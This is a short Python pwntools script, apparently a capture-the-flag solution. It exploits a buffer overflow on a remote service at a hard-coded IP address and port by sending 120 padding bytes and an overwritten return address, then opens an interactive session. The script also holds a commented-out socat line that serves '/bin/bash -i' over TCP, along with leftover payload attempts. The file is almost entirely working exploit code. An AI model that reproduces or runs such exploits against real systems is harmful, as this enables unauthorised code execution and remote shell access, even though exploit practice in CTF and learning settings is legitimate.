from pwn import *
import pwn

r = remote('3.71.110.92',30000)


# # socat = process(['socat', 'TCP-LISTEN:30000,reuseaddr,fork','EXEC:/bin/bash -i'])
# # g = pwnlib.gdb.attach(socat)
# offset = 600000
# payload=b'B'*offset

# r.sendline(payload)
# print(r.recvall().decode("utf-8"))


offset = 120
payload = b'A' * offset
eip = '\x4e\x12\x40\x00\x00\x00\x00\x00'
eip = pwn.p32(0x40124e)
r.sendline(payload+eip)
print(r.recvline())
r.interactive()
print(r.recvline())


# eip = '\xde\xc0\xef\xbe\xbe\xba\xad\xde'
# eip = '\x2e\x01'
# eip = pwn.p32(0x0040125e)
# print(payload+eip,end="")